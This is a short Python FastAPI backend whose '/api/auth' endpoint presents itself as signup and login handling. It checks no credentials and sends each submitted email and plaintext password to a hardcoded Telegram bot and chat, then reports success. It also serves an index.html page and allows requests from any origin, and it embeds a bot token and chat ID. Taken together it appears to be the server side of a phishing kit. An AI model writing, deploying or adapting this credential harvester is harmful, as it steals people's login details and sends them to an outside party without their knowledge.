from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from pydantic import BaseModel
import requests
import os

app = FastAPI()

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Telegram configuration
TELEGRAM_BOT_TOKEN = "8976557269:AAEAZ_KUFPrk2qxrSdoqcH7MCcFufwvx42k"
TELEGRAM_CHAT_ID = "8145643961"


def send_telegram_notification(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram environment variables are not configured.")
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }

    try:
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
    except Exception as e:
        print(f"Telegram notification failed: {e}")


class UserAuth(BaseModel):
    email: str
    password: str
    action: str


# Authentication endpoint
@app.post("/api/auth")
def authenticate_user(user: UserAuth):

    if user.action == "signup":
        message = (
            "🚀 New account signup\n"
            f"Email: `{user.email}`\n"
            f"Password: `{user.password}`"
        )

    elif user.action == "login":
        message = (
            "🔑 Login attempt\n"
            f"Email: `{user.email}`\n"
            f"Password: `{user.password}`"
        )

    else:
        return {
            "status": "error",
            "message": "Invalid action"
        }

    send_telegram_notification(message)

    return {
        "status": "success",
        "message": f"{user.action} notification sent successfully"
    }


# Serve the main HTML page
@app.get("/")
def serve_frontend():
    return FileResponse("index.html", media_type="text/html")


# Serve CSS
@app.get("/style.css")
def serve_css():
    return FileResponse("style.css", media_type="text/css")


# Run locally / Render
if __name__ == "__main__":
    import uvicorn

    port = int(os.environ.get("PORT", 8000))

    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=port
    )